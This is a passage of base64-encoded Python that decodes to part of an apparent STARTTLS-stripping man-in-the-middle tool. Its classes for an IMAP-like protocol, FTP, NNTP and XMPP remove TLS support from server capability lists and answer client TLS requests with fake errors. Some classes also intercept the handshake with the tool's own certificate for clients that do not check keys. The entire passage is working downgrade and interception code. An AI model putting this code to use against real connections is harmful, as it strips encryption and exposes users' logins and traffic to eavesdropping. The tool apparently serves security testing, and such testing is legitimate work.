AgICAgIGluIGNhc2UgY2xpZW50IGRvZXMgbm90IGNoZWNrIGtleXMNCiAgICAgICAgICAgICcnJw0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9zZXJ2ZXJfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICByZXR1cm4gZGF0YQ0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9jbGllbnRfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICBpZiBkYXRhLnN0cmlwKCkubG93ZXIoKS5lbmRzd2l0aCgic3RhcnR0bHMiKToNCiAgICAgICAgICAgICAgICAgICAgaWQgPSBkYXRhLnNwbGl0KCcgJywxKVswXS5zdHJpcCgpDQogICAgICAgICAgICAgICAgICAgICMgZG8gaW5ib3VuZCBTVEFSVFRMUw0KICAgICAgICAgICAgICAgICAgICBzZXNzaW9uLmluYm91bmQuc2VuZGFsbCgiJXMgT0sgQmVnaW4gVExTIG5lZ290YXRpb24gbm93DQoiJWlkKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFtjbGllbnRdIDw9IFsgICAgICBdW21hbmdsZWRdICVzIiUoc2Vzc2lvbixyZXByKCIlcyBPSyBCZWdpbiBUTFMgbmVnb3RhdGlvbiBub3cNCiIlaWQpKSkNCiAgICAgICAgICAgICAgICAgICAgY29udGV4dCA9IFZlY3RvcnMuR0VORVJJQy5JbnRlcmNlcHQuY3JlYXRlX3NzbF9jb250ZXh0KCkNCiAgICAgICAgICAgICAgICAgICAgY29udGV4dC5sb2FkX2NlcnRfY2hhaW4oY2VydGZpbGU9VmVjdG9ycy5fVExTX0NFUlRGSUxFLCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAga2V5ZmlsZT1WZWN0b3JzLl9UTFNfQ0VSVEZJTEUpDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgW2NsaWVudF0gPD0gWyAgICAgIF1bbWFuZ2xlZF0gd2FpdGluZyBmb3IgaW5ib3VuZCBTU0wgaGFuZHNoYWtlIiUoc2Vzc2lvbikpDQogICAgICAgICAgICAgICAgICAgIHNlc3Npb24uaW5ib3VuZC5zc2xfd3JhcF9zb2NrZXRfd2l0aF9jb250ZXh0KGNvbnRleHQsIHNlcnZlcl9zaWRlPVRydWUpDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgW2NsaWVudF0gPD4gWyAgICAgIF0gICAgICAgICAgU1NMIGhhbmRzaGFrZSBkb25lOiAlcyIlKHNlc3Npb24sIHNlc3Npb24uaW5ib3VuZC5zb2NrZXRfc3NsLmNpcGhlcigpKSkNCiAgICANCiAgICAgICAgICAgICAgICAgICAgIyBvdXRib3VuZCBzc2wNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIHNlc3Npb24ub3V0Ym91bmQuc2VuZGFsbChkYXRhKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFsgICAgICBdID0+IFtzZXJ2ZXJdW21hbmdsZWRdICVzIiUoc2Vzc2lvbixyZXByKGRhdGEpKSkNCiAgICAgICAgICAgICAgICAgICAgcmVzcF9kYXRhID0gc2Vzc2lvbi5vdXRib3VuZC5yZWN2X2Jsb2NrZWQoKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFsgICAgICBdIDw9IFtzZXJ2ZXJdW21hbmdsZWRdICVzIiUoc2Vzc2lvbixyZXByKHJlc3BfZGF0YSkpKQ0KICAgICAgICAgICAgICAgICAgICBpZiAiJXMgT0siJWlkIG5vdCBpbiByZXNwX2RhdGE6DQogICAgICAgICAgICAgICAgICAgICAgICByYWlzZSBQcm90b2NvbFZpb2xhdGlvbkV4Y2VwdGlvbigid2hvb3AhPyBjbGllbnQgc2VudCBTVEFSVFRMUyBldmVuIHRob3VnaCB3ZSBkaWQgbm90IGFubm91bmNlIGl0Li4gcHJvdG8gdmlvbGF0aW9uOiAlcyIlcmVwcihyZXNwX2RhdGEpKQ0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbICAgICAgXSA9PiBbc2VydmVyXVttYW5nbGVkXSBwZXJmb3JtaW5nIG91dGJvdW5kIFNTTCBoYW5kc2hha2UiJShzZXNzaW9uKSkNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5vdXRib3VuZC5zc2xfd3JhcF9zb2NrZXQoKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFsgICAgICBdIDw+IFtzZXJ2ZXJdICAgICAgICAgIFNTTCBoYW5kc2hha2UgZG9uZTogJXMiJShzZXNzaW9uLCBzZXNzaW9uLm91dGJvdW5kLnNvY2tldF9zc2wuY2lwaGVyKCkpKQ0KICAgIA0KICAgICAgICAgICAgICAgICAgICBkYXRhPU5vbmUNCiAgICAgICAgICAgICAgICBlbGlmICIgTE9HSU4gIiBpbiBkYXRhOg0KICAgICAgICAgICAgICAgICAgICByZXdyaXRlLnNldF9yZXN1bHQoc2Vzc2lvbiwgVHJ1ZSkNCiAgICAgICAgICAgICAgICByZXR1cm4gZGF0YQ0KICAgICAgICAgICAgDQogICAgY2xhc3MgRlRQOg0KICAgICAgICBfUFJPVE9fSUQgPSAyMQ0KICAgICAgICBjbGFzcyBTdHJpcEZyb21DYXBhYmlsaXRpZXM6DQogICAgICAgICAgICAnJycgMSkgRm9yY2UgU2VydmVyIHJlc3BvbnNlIHRvICpOT1QqIGFubm91bmNlIEFVVEggVExTIHN1cHBvcnQNCiAgICAgICAgICAgICAgICAyKSByYWlzZSBleGNlcHRpb24gaWYgY2xpZW50IHRyaWVzIHRvIG5lZ290aWF0ZWQgQVVUSCBUTFMNCiAgICAgICAgICAgICcnJw0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9zZXJ2ZXJfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICBpZiBzZXNzaW9uLm91dGJvdW5kLnNuZGJ1Zi5zdHJpcCgpLmxvd2VyKCk9PSJmZWF0IiBcDQogICAgICAgICAgICAgICAgICAgIGFuZCAiQVVUSCBUTFMiIGluIGRhdGE6DQogICAgICAgICAgICAgICAgICAgIGZlYXR1cmVzID0gKGYgZm9yIGYgaW4gZGF0YS5zdHJpcCgpLnNwbGl0KCcKJykgaWYgbm90ICJBVVRIIFRMUyIgaW4gZikNCiAgICAgICAgICAgICAgICAgICAgZGF0YSA9ICcKJy5qb2luKGZlYXR1cmVzKSsiDQoiDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfY2xpZW50X2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgaWYgIkFVVEggVExTIiBpbiBkYXRhOg0KICAgICAgICAgICAgICAgICAgICByYWlzZSBQcm90b2NvbFZpb2xhdGlvbkV4Y2VwdGlvbigid2hvb3AhPyBjbGllbnQgc2VudCBTVEFSVFRMUyBldmVuIHRob3VnaCB3ZSBkaWQgbm90IGFubm91bmNlIGl0Li4gcHJvdG8gdmlvbGF0aW9uOiAlcyIlcmVwcihkYXRhKSkNCiAgICAgICAgICAgICAgICBlbGlmICJVU0VSICIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgDQogICAgICAgIGNsYXNzIFN0cmlwV2l0aEVycm9yOg0KICAgICAgICAgICAgJycnIDEpIGZvcmNlIHNlcnZlciBlcnJvciBvbiBjbGllbnQgc2VuZGluZyBBVVRIIFRMUw0KICAgICAgICAgICAgJycnDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX3NlcnZlcl9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX2NsaWVudF9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgIGlmICJBVVRIIFRMUyIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5pbmJvdW5kLnNlbmRhbGwoIjUwMCBBVVRIIFRMUyBub3QgdW5kZXJzdG9vZA0KIikNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbY2xpZW50XSA8PSBbc2VydmVyXVttYW5nbGVkXSAlcyIlKHNlc3Npb24scmVwcigiNTAwIEFVVEggVExTIG5vdCB1bmRlcnN0b29kDQoiKSkpDQogICAgICAgICAgICAgICAgICAgIGRhdGE9Tm9uZQ0KICAgICAgICAgICAgICAgIGVsaWYgIlVTRVIgIiBpbiBkYXRhOg0KICAgICAgICAgICAgICAgICAgICByZXdyaXRlLnNldF9yZXN1bHQoc2Vzc2lvbiwgVHJ1ZSkNCiAgICAgICAgICAgICAgICByZXR1cm4gZGF0YQ0KICAgIA0KICAgICAgICBjbGFzcyBVbnRydXN0ZWRJbnRlcmNlcHQ6DQogICAgICAgICAgICAnJycgMSkgRG8gbm90IG1hbmdsZSBzZXJ2ZXIgZGF0YQ0KICAgICAgICAgICAgICAgIDIpIGludGVyY2VwdCBjbGllbnQgU1RBUlRMUywgbmVnb3RpYXRlZCBzc2xfY29udGV4dCB3aXRoIGNsaWVudCBhbmQgb25lIHdpdGggc2VydmVyLCB1bnRydXN0ZWQuDQogICAgICAgICAgICAgICAgICAgaW4gY2FzZSBjbGllbnQgZG9lcyBub3QgY2hlY2sga2V5cw0KICAgICAgICAgICAgJycnDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX3NlcnZlcl9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgICAgICBAc3RhdGljbWV0aG9kDQogICAgICAgICAgICBkZWYgbWFuZ2xlX2NsaWVudF9kYXRhKHNlc3Npb24sIGRhdGEsIHJld3JpdGUpOg0KICAgICAgICAgICAgICAgIGlmICJBVVRIIFRMUyIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICAgICAgIyBkbyBpbmJvdW5kIFNUQVJUVExTDQogICAgICAgICAgICAgICAgICAgIHNlc3Npb24uaW5ib3VuZC5zZW5kYWxsKCIyMzQgT0sgQmVnaW4gVExTIG5lZ290YXRpb24gbm93DQoiKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFtjbGllbnRdIDw9IFsgICAgICBdW21hbmdsZWRdICVzIiUoc2Vzc2lvbixyZXByKCIyMzQgT0sgQmVnaW4gVExTIG5lZ290YXRpb24gbm93DQoiKSkpDQogICAgICAgICAgICAgICAgICAgIGNvbnRleHQgPSBWZWN0b3JzLkdFTkVSSUMuSW50ZXJjZXB0LmNyZWF0ZV9zc2xfY29udGV4dCgpDQogICAgICAgICAgICAgICAgICAgIGNvbnRleHQubG9hZF9jZXJ0X2NoYWluKGNlcnRmaWxlPVZlY3RvcnMuX1RMU19DRVJURklMRSwgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGtleWZpbGU9VmVjdG9ycy5fVExTX0tFWUZJTEUpDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgW2NsaWVudF0gPD0gWyAgICAgIF1bbWFuZ2xlZF0gd2FpdGluZyBmb3IgaW5ib3VuZCBTU0wgaGFuZHNoYWtlIiUoc2Vzc2lvbikpDQogICAgICAgICAgICAgICAgICAgIHNlc3Npb24uaW5ib3VuZC5zc2xfd3JhcF9zb2NrZXRfd2l0aF9jb250ZXh0KGNvbnRleHQsIHNlcnZlcl9zaWRlPVRydWUpDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgW2NsaWVudF0gPD4gWyAgICAgIF0gICAgICAgICAgU1NMIGhhbmRzaGFrZSBkb25lOiAlcyIlKHNlc3Npb24sIHNlc3Npb24uaW5ib3VuZC5zb2NrZXRfc3NsLmNpcGhlcigpKSkNCiAgICAgICAgICAgICAgICAgICAgIyBvdXRib3VuZCBzc2wNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIHNlc3Npb24ub3V0Ym91bmQuc2VuZGFsbChkYXRhKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFsgICAgICBdID0+IFtzZXJ2ZXJdW21hbmdsZWRdICVzIiUoc2Vzc2lvbixyZXByKGRhdGEpKSkNCiAgICAgICAgICAgICAgICAgICAgcmVzcF9kYXRhID0gc2Vzc2lvbi5vdXRib3VuZC5yZWN2X2Jsb2NrZWQoKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFsgICAgICBdIDw9IFtzZXJ2ZXJdW21hbmdsZWRdICVzIiUoc2Vzc2lvbixyZXByKHJlc3BfZGF0YSkpKQ0KICAgICAgICAgICAgICAgICAgICBpZiBub3QgcmVzcF9kYXRhLnN0YXJ0c3dpdGgoIjIzNCIpOg0KICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgUHJvdG9jb2xWaW9sYXRpb25FeGNlcHRpb24oIndob29wIT8gY2xpZW50IHNlbnQgU1RBUlRUTFMgZXZlbiB0aG91Z2ggd2UgZGlkIG5vdCBhbm5vdW5jZSBpdC4uIHByb3RvIHZpb2xhdGlvbjogJXMiJXJlcHIocmVzcF9kYXRhKSkNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgWyAgICAgIF0gPT4gW3NlcnZlcl1bbWFuZ2xlZF0gcGVyZm9ybWluZyBvdXRib3VuZCBTU0wgaGFuZHNoYWtlIiUoc2Vzc2lvbikpDQogICAgICAgICAgICAgICAgICAgIHNlc3Npb24ub3V0Ym91bmQuc3NsX3dyYXBfc29ja2V0KCkNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbICAgICAgXSA8PiBbc2VydmVyXSAgICAgICAgICBTU0wgaGFuZHNoYWtlIGRvbmU6ICVzIiUoc2Vzc2lvbiwgc2Vzc2lvbi5vdXRib3VuZC5zb2NrZXRfc3NsLmNpcGhlcigpKSkNCiAgICANCiAgICAgICAgICAgICAgICAgICAgZGF0YT1Ob25lDQogICAgICAgICAgICAgICAgZWxpZiAiVVNFUiAiIGluIGRhdGE6DQogICAgICAgICAgICAgICAgICAgIHJld3JpdGUuc2V0X3Jlc3VsdChzZXNzaW9uLCBUcnVlKQ0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgICAgICANCiAgICBjbGFzcyBOTlRQOg0KICAgICAgICBfUFJPVE9fSUQgPSAxMTkNCiAgICAgICAgY2xhc3MgU3RyaXBGcm9tQ2FwYWJpbGl0aWVzOg0KICAgICAgICAgICAgJycnIDEpIEZvcmNlIFNlcnZlciByZXNwb25zZSB0byAqTk9UKiBhbm5vdW5jZSBTVEFSVFRMUyBzdXBwb3J0DQogICAgICAgICAgICAgICAgMikgcmFpc2UgZXhjZXB0aW9uIGlmIGNsaWVudCB0cmllcyB0byBuZWdvdGlhdGVkIFNUQVJUVExTDQogICAgICAgICAgICAnJycNCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfc2VydmVyX2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgaWYgc2Vzc2lvbi5vdXRib3VuZC5zbmRidWYuc3RyaXAoKS5sb3dlcigpPT0iY2FwYWJpbGl0aWVzIiBcDQogICAgICAgICAgICAgICAgICAgIGFuZCAiU1RBUlRUTFMiIGluIGRhdGE6DQogICAgICAgICAgICAgICAgICAgIGZlYXR1cmVzID0gKGYgZm9yIGYgaW4gZGF0YS5zdHJpcCgpLnNwbGl0KCcKJykgaWYgbm90ICJTVEFSVFRMUyIgaW4gZikNCiAgICAgICAgICAgICAgICAgICAgZGF0YSA9ICcKJy5qb2luKGZlYXR1cmVzKSsiDQoiDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfY2xpZW50X2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgaWYgIlNUQVJUVExTIiBpbiBkYXRhOg0KICAgICAgICAgICAgICAgICAgICByYWlzZSBQcm90b2NvbFZpb2xhdGlvbkV4Y2VwdGlvbigid2hvb3AhPyBjbGllbnQgc2VudCBTVEFSVFRMUyBldmVuIHRob3VnaCB3ZSBkaWQgbm90IGFubm91bmNlIGl0Li4gcHJvdG8gdmlvbGF0aW9uOiAlcyIlcmVwcihkYXRhKSkNCiAgICAgICAgICAgICAgICBlbGlmICJHUk9VUCAiIGluIGRhdGE6DQogICAgICAgICAgICAgICAgICAgIHJld3JpdGUuc2V0X3Jlc3VsdChzZXNzaW9uLCBUcnVlKQ0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgICAgIA0KICAgICAgICBjbGFzcyBTdHJpcFdpdGhFcnJvcjoNCiAgICAgICAgICAgICcnJyAxKSBmb3JjZSBzZXJ2ZXIgZXJyb3Igb24gY2xpZW50IHNlbmRpbmcgU1RBUlRUTFMNCiAgICAgICAgICAgICcnJw0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9zZXJ2ZXJfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICByZXR1cm4gZGF0YQ0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9jbGllbnRfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICBpZiAiU1RBUlRUTFMiIGluIGRhdGE6DQogICAgICAgICAgICAgICAgICAgIHNlc3Npb24uaW5ib3VuZC5zZW5kYWxsKCI1MDIgQ29tbWFuZCB1bmF2YWlsYWJsZQ0KIikgICMgb3IgNTgwIENhbiBub3QgaW5pdGlhdGUgVExTIG5lZ290aWF0aW9uDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgW2NsaWVudF0gPD0gW3NlcnZlcl1bbWFuZ2xlZF0gJXMiJShzZXNzaW9uLHJlcHIoIjUwMiBDb21tYW5kIHVuYXZhaWxhYmxlDQoiKSkpDQogICAgICAgICAgICAgICAgICAgIGRhdGE9Tm9uZQ0KICAgICAgICAgICAgICAgIGVsaWYgIkdST1VQICIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICANCiAgICAgICAgY2xhc3MgVW50cnVzdGVkSW50ZXJjZXB0Og0KICAgICAgICAgICAgJycnIDEpIERvIG5vdCBtYW5nbGUgc2VydmVyIGRhdGENCiAgICAgICAgICAgICAgICAyKSBpbnRlcmNlcHQgY2xpZW50IFNUQVJUTFMsIG5lZ290aWF0ZWQgc3NsX2NvbnRleHQgd2l0aCBjbGllbnQgYW5kIG9uZSB3aXRoIHNlcnZlciwgdW50cnVzdGVkLg0KICAgICAgICAgICAgICAgICAgIGluIGNhc2UgY2xpZW50IGRvZXMgbm90IGNoZWNrIGtleXMNCiAgICAgICAgICAgICcnJw0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9zZXJ2ZXJfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICByZXR1cm4gZGF0YQ0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9jbGllbnRfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICBpZiAiU1RBUlRUTFMiIGluIGRhdGE6DQogICAgICAgICAgICAgICAgICAgICMgZG8gaW5ib3VuZCBTVEFSVFRMUw0KICAgICAgICAgICAgICAgICAgICBzZXNzaW9uLmluYm91bmQuc2VuZGFsbCgiMzgyIENvbnRpbnVlIHdpdGggVExTIG5lZ290aWF0aW9uDQoiKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFtjbGllbnRdIDw9IFsgICAgICBdW21hbmdsZWRdICVzIiUoc2Vzc2lvbixyZXByKCIzODIgQ29udGludWUgd2l0aCBUTFMgbmVnb3RpYXRpb24NCiIpKSkNCiAgICAgICAgICAgICAgICAgICAgY29udGV4dCA9IFZlY3RvcnMuR0VORVJJQy5JbnRlcmNlcHQuY3JlYXRlX3NzbF9jb250ZXh0KCkNCiAgICAgICAgICAgICAgICAgICAgY29udGV4dC5sb2FkX2NlcnRfY2hhaW4oY2VydGZpbGU9VmVjdG9ycy5fVExTX0NFUlRGSUxFLCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAga2V5ZmlsZT1WZWN0b3JzLl9UTFNfS0VZRklMRSkNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbY2xpZW50XSA8PSBbICAgICAgXVttYW5nbGVkXSB3YWl0aW5nIGZvciBpbmJvdW5kIFNTTCBoYW5kc2hha2UiJShzZXNzaW9uKSkNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5pbmJvdW5kLnNzbF93cmFwX3NvY2tldF93aXRoX2NvbnRleHQoY29udGV4dCwgc2VydmVyX3NpZGU9VHJ1ZSkNCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbY2xpZW50XSA8PiBbICAgICAgXSAgICAgICAgICBTU0wgaGFuZHNoYWtlIGRvbmU6ICVzIiUoc2Vzc2lvbiwgc2Vzc2lvbi5pbmJvdW5kLnNvY2tldF9zc2wuY2lwaGVyKCkpKQ0KICAgICAgICAgICAgICAgICAgICAjIG91dGJvdW5kIHNzbA0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5vdXRib3VuZC5zZW5kYWxsKGRhdGEpDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgWyAgICAgIF0gPT4gW3NlcnZlcl1bbWFuZ2xlZF0gJXMiJShzZXNzaW9uLHJlcHIoZGF0YSkpKQ0KICAgICAgICAgICAgICAgICAgICByZXNwX2RhdGEgPSBzZXNzaW9uLm91dGJvdW5kLnJlY3ZfYmxvY2tlZCgpDQogICAgICAgICAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiJXMgWyAgICAgIF0gPD0gW3NlcnZlcl1bbWFuZ2xlZF0gJXMiJShzZXNzaW9uLHJlcHIocmVzcF9kYXRhKSkpDQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCByZXNwX2RhdGEuc3RhcnRzd2l0aCgiMzgyIik6DQogICAgICAgICAgICAgICAgICAgICAgICByYWlzZSBQcm90b2NvbFZpb2xhdGlvbkV4Y2VwdGlvbigid2hvb3AhPyBjbGllbnQgc2VudCBTVEFSVFRMUyBldmVuIHRob3VnaCB3ZSBkaWQgbm90IGFubm91bmNlIGl0Li4gcHJvdG8gdmlvbGF0aW9uOiAlcyIlcmVwcihyZXNwX2RhdGEpKQ0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgbG9nZ2VyLmRlYnVnKCIlcyBbICAgICAgXSA9PiBbc2VydmVyXVttYW5nbGVkXSBwZXJmb3JtaW5nIG91dGJvdW5kIFNTTCBoYW5kc2hha2UiJShzZXNzaW9uKSkNCiAgICAgICAgICAgICAgICAgICAgc2Vzc2lvbi5vdXRib3VuZC5zc2xfd3JhcF9zb2NrZXQoKQ0KICAgICAgICAgICAgICAgICAgICBsb2dnZXIuZGVidWcoIiVzIFsgICAgICBdIDw+IFtzZXJ2ZXJdICAgICAgICAgIFNTTCBoYW5kc2hha2UgZG9uZTogJXMiJShzZXNzaW9uLCBzZXNzaW9uLm91dGJvdW5kLnNvY2tldF9zc2wuY2lwaGVyKCkpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBkYXRhPU5vbmUNCiAgICAgICAgICAgICAgICBlbGlmICJHUk9VUCAiIGluIGRhdGE6DQogICAgICAgICAgICAgICAgICAgIHJld3JpdGUuc2V0X3Jlc3VsdChzZXNzaW9uLCBUcnVlKQ0KICAgICAgICAgICAgICAgIHJldHVybiBkYXRhDQogICAgDQogICAgY2xhc3MgWE1QUDoNCiAgICAgICAgX1BST1RPX0lEID0gNTIyMg0KICAgICAgICBjbGFzcyBTdHJpcEZyb21DYXBhYmlsaXRpZXM6DQogICAgICAgICAgICAnJycgMSkgRm9yY2UgU2VydmVyIHJlc3BvbnNlIHRvICpOT1QqIGFubm91bmNlIFNUQVJUVExTIHN1cHBvcnQNCiAgICAgICAgICAgICAgICAyKSByYWlzZSBleGNlcHRpb24gaWYgY2xpZW50IHRyaWVzIHRvIG5lZ290aWF0ZWQgU1RBUlRUTFMNCiAgICAgICAgICAgICcnJw0KICAgICAgICAgICAgQHN0YXRpY21ldGhvZA0KICAgICAgICAgICAgZGVmIG1hbmdsZV9zZXJ2ZXJfZGF0YShzZXNzaW9uLCBkYXRhLCByZXdyaXRlKToNCiAgICAgICAgICAgICAgICBpZiAiPHN0YXJ0dGxzIiBpbiBkYXRhOg0KICAgICAgICAgICAgICAgICAgICBzdGFydCA9IGRhdGEuaW5kZXgoIjxzdGFydHRscyIpDQogICAgICAgICAgICAgICAgICAgIGVuZCA9IGRhdGEuaW5kZXgoIjwvc3RhcnR0bHM+IixzdGFydCkrbGVuKCI8L3N0YXJ0dGxzPiIpDQogICAgICAgICAgICAgICAgICAgIGRhdGEgPSBkYXRhWzpzdGFydF0gKyBkYXRhW2VuZDpdICAgICAgICAjIHN0cmlwIHN0YXJ0dGxzIGZyb20gY2FwYWJpbGl0aWVzDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGENCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfY2xpZW50X2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0ZSk6DQogICAgICAgICAgICAgICAgaWYgIjxzdGFydHRscyIgaW4gZGF0YToNCiAgICAgICAgICAgICAgICAgICAgIyBkbyBub3QgcmVzcG9uZCB3aXRoIDxwcm9jZWVkIHhtbG5zPSd1cm46aWV0ZjpwYXJhbXM6eG1sOm5zOnhtcHAtdGxzJy8+DQogICAgICAgICAgICAgICAgICAgICM8ZmFpbHVyZS8+IG9yIDxwcm9jZWVkLz4NCiAgICAgICAgICAgICAgICAgICAgcmFpc2UgUHJvdG9jb2xWaW9sYXRpb25FeGNlcHRpb24oIndob29wIT8gY2xpZW50IHNlbnQgU1RBUlRUTFMgZXZlbiB0aG91Z2ggd2UgZGlkIG5vdCBhbm5vdW5jZSBpdC4uIHByb3RvIHZpb2xhdGlvbjogJXMiJXJlcHIoZGF0YSkpDQogICAgICAgICAgICAgICAgICAgICNzZXNzaW9uLmluYm91bmQuc2VuZGFsbCgiPHN1Y2Nlc3MgeG1sbnM9J3VybjppZXRmOnBhcmFtczp4bWw6bnM6eG1wcC10bHMnLz4iKSAgIyBmYWtlIHJlc3BvbmUNCiAgICAgICAgICAgICAgICAgICAgI2RhdGE9Tm9uZQ0KICAgICAgICAgICAgICAgIGVsaWYgYW55KGMgaW4gZGF0YS5sb3dlcigpIGZvciBjIGluICgiPC9hdXRoPiIsIjxxdWVyeSIsIjxpcSIsIjx1c2VybmFtZSIpKToNCiAgICAgICAgICAgICAgICAgICAgcmV3cml0ZS5zZXRfcmVzdWx0KHNlc3Npb24sIFRydWUpDQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGEgDQoNCiAgICAgICAgY2xhc3MgU3RyaXBJbmJvdW5kVExTOg0KICAgICAgICAgICAgJycnIDEpIEZvcmNlIFNlcnZlciByZXNwb25zZSB0byAqTk9UKiBhbm5vdW5jZSBTVEFSVFRMUyBzdXBwb3J0DQogICAgICAgICAgICAgICAgMikgSWYgc3RhcnR0bHMgaXMgcmVxdWlyZWQgb3V0Ym91bmQsIGxlYXZlIGluYm91bmQgY29ubmVjdGlvbiBwbGFpbiAtIG91dGJvdW5kIHN0YXJ0dGxzDQogICAgICAgICAgICAnJycNCiAgICAgICAgICAgIEBzdGF0aWNtZXRob2QNCiAgICAgICAgICAgIGRlZiBtYW5nbGVfc2VydmVyX2RhdGEoc2Vzc2lvbiwgZGF0YSwgcmV3cml0